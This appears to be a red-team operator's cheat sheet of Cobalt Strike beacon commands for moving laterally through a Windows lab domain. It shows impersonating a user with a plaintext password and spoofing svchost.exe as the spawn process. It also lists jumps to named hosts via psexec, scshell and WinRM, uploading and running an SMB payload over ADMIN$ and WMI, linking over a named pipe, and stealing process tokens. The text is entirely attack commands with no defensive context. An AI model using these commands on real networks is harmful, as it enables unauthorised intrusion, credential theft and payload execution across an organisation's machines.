
Create logon session as local Admin
```powershell
make_token CONTOSO\rsteel Passw0rd!
```

Change the `spawnto` for the service payload
```powershell
ak-settings spawnto_x86 C:\Windows\SysWOW64\svchost.exe
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Jump via psexec64
```powershell
jump scshell64 DUB-WEB-1 smb

jump psexec64 DUB-WKSTN-2 smb

jump winrm64 DUB-WEB-1 smb

jump scshell64 dub-sql-1.dublin.contoso.com smb

jump psexec64 enc-fs-1.contoso.enclave smb
```

---

Manual
```powershell
cd \\enc-jmp-1.contoso.enclave\ADMIN$

upload C:\Payloads\smb_x64.exe

remote-exec wmi enc-jmp-1.contoso.enclave C:\Windows\smb_x64.exe
```


```powershell
link smb enc-jmp-1.contoso.enclave W32TIME_ALT-1337
```

```powershell
token-store steal 3184
token-store use 0 
```